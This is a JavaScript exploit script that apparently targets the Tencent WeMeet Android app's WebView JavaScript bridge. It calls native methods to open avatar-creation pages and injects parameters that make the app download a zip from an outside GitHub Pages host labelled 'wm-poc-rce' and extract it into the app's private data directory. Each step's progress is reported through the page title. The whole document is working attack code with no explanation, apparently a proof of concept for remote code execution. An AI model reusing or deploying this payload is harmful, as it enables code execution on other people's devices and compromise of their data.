(function(){
  document.title='P98TB:'+location.host;
  window.__p=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    document.title='P98CB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,80);
  };
  function c(id,mod,m,p){
    try{
      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
        callback:'window.__p',module:mod,method:m,param:p,callId:id
      }));
    }catch(e){
      document.title='P98TB-NOJS:'+location.host;
    }
  }
  if(!window.JSCallJavaMgr){document.title='P98TB-NOMGR:'+location.host;return}
  var zip='https://gitwhs.github.io/wm-poc-rce/p98avatar.zip';
  var md5='02c4e3f10ad3d0e15aa9cff934d3d262';
  var extras={
    extract_path:'/data/data/com.tencent.wemeet.app/files/Global/Data/AvatarModel/p98extract',
    model_resource_url:zip,
    model_resource_md5:md5,
    model_resource_url_:zip,
    model_resource_md5_:md5,
    resource_url:zip,
    resource_md5:md5,
    resource_url_:zip,
    resource_md5_:md5,
    download_url:zip,
    url:zip,
    template_url:zip,
    template_id:'p98',
    from_webView:true,
    download_needed:true
  };
  var q=[
    ['H2','CommonPlugin','GetPerformance',{}],
    ['CF','CommonPlugin','OpenNewPage',{
      scheme:'wemeet://page/ar_avatar_create_face',
      router_params:extras
    }],
    ['GP','CommonPlugin','OpenNewPage',{
      scheme:'wemeet://page/ar_create_avatar_guide_pay',
      router_params:extras
    }]
  ];
  var i=0;
  function n(){
    if(i>=q.length){document.title='P98TB-DONE:'+location.host;return}
    var x=q[i++];
    document.title='P98-RUN:'+x[0];
    c(x[0],x[1],x[2],x[3]);
    setTimeout(n, 4500);
  }
  setTimeout(n, 800);
})();
